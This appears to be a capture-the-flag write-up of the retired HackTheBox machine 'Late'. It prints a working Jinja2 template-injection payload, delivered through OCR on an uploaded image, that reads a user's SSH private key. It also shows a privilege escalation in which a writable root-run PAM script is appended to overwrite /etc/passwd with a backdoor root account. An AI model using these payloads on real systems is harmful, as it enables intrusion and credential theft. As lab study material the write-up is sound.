This article is a writeup about a retired HacktheBox machine:
[Late](https://www.hackthebox.com/home/machines/profile/463) publish on
April 23, 2022 by
[kavigihan](https://www.hackthebox.com/home/users/profile/389926).
This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary.

# Foothold and user

## Recon

Let us start as always by a `nmap` scan. Only port 80 (HTTP) and 22 (SSH) are open.

Port 80 was a web application containing a link to a subdomain 
`http://images.late.htb/`. This application allowed to perform OCR on images.
We test a few example and realize that we are facing [SSTI](https://portswigger.net/web-security/server-side-template-injection).

We upload an image containing the basic SSTI identification:

![SSTI identification](/media/2023.xx/late_01.png)

The application resolved the second operation.

    :::text
    <p>${8*8} aa 49
    </p>

Following PortSwigger graph I uploaded a new image.

![SSTI identification 2](/media/2023.xx/late_02.png)

The application resolved `7*'7'` as `7777777`. Therefore the application was using Jinja2.

A [blog post](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) described Jinja injection.

I verified that `popen` is available:

![checking popen](/media/2023.xx/late_03.png)

Then by dichotomy I founded the `popen` index.

![popen index](/media/2023.xx/late_04.png)

`Popen` was the subprocess with index 249.

    :::text
    <p>[&lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;]
    </p>

I ran `ls` to proved that I had RCE.

    :::text
    <p>(b&#39;main.py\nmisc\n__pycache__\nstatic\ntemplates\nuploads\nwsgi.py\n&#39;, None)
    </p>

I ran `id` to get an idea of which user was running the application. The user `id` was 1000 meaning that this
was probably a standard human user.

    :::text
    <p>(b&#39;uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n&#39;, None)

After a few trials, I found a payload that allowed to retrieve `id_rsa` from the user.

    :::text
    {{''.__class__.__mro__[1].__subclasses__()[249](['cat','/home/svc_acc/.ssh/id_rsa'],stdout=-1).communicate()}}

I connected to the box using SSH and grabbed the user flag.

    :::text
    └─$ ssh svc_acc@10.129.72.242 -i id_rsa
    svc_acc@late:~$ id
    uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
    svc_acc@late:~$ cat user.txt
    17295259a78e40790974b3ac7d2d0a8f

# Root

I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and found that there was a user writable file in `/usr/local/sbin`, a folder where binary are run as root.

    :::bash
    #!/bin/bash

    RECIPIENT="root@late.htb"
    SUBJECT="Email from Server Login: SSH Alert"

    BODY="
    A SSH login was detected.

            User:        $PAM_USER
            User IP Host: $PAM_RHOST
            Service:     $PAM_SERVICE
            TTY:         $PAM_TTY
            Date:        `date`
            Server:      `uname -a`
    "

    if [ ${PAM_TYPE} = "open_session" ]; then
            echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
    fi


I copied `/etc/passwd` and added a new line containing a root user (`id=0`) with the password `pass123`:
`toto2:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash`

Then I modified the `/usr/local/sbin/ssh-alert.sh` file to copy the modified `passwd` file in `etc`:
`echo 'cp /home/svc_acc/passwd /etc/passwd' >>/usr/local/sbin/ssh-alert.sh`

Then I connect to ssh with our `svc_acc` user and switch user to `toto2` and grabbed the flag.

    :::text
    svc_acc@late:~$ su toto2
    root@late:/home/svc_acc# id
    uid=0(root) gid=0(root) groups=0(root)
    root@late:/home/svc_acc# cd
    root@late:~# cat root.txt

# Wrapping up

A nice box exploiting SSTI and a SUID binary. The fact that the SSTI was in an image was
fun but tedious as sometime the OCR was not perfect and submitting the same image another
time did not give the same result.
